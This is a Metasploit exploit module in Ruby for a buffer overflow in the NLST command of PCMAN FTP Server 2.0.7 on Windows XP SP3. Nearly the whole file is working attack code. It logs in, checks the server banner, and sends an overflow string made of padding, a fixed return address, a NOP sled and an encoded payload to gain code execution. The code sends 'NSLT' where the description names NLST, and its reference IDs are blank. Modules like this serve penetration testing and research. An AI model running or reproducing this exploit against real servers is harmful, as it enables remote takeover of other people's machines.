##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Ftp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PCMAN FTP Server Buffer Overflow - NLST Command',
      'Description'    => %q{
          This module exploits a buffer overflow vulnerability found in the NLST command of the
          PCMAN FTP v2.0.7 Server. This requires authentication but by default anonymous
          credientials are enabled.
      },
      'Author'         =>
          [
            'Karri93',      # Initial Discovery -- https://www.exploit-db.com/exploits/40712/
            'Ye Yint Min Thu Htut'   # msf Module -- @yeyint_mth @yehg
          ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'EDB',   ''],
          [ 'OSVDB',   '']
        ],
      'DefaultOptions' =>
        {
          'EXITFUNC' => 'process'
        },
      'Payload'        =>
        {
          'Space'   => 1000,
          'BadChars'  => "\x00\x0A\x0D",
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Windows XP SP3 English',
            {
              'Ret' => 0x77f11d2f, # GDI32.dll
              'Offset' => 2007
            }
          ],
        ],
      'DisclosureDate' => 'Nov 04 2016',
      'DefaultTarget'  => 0))
  end

  def check
    connect_login
    disconnect

    if /220 PCMan's FTP Server 2\.0/ === banner
      Exploit::CheckCode::Appears
    else
      Exploit::CheckCode::Safe
    end
  end


  def exploit
    connect_login

    print_status('Creating payload...')
    sploit = rand_text_alpha(target['Offset'])
    sploit << [target.ret].pack('V')
    sploit << make_nops(30)
    sploit << payload.encoded

    send_cmd( ["NSLT", sploit], false )
    disconnect
  end

end
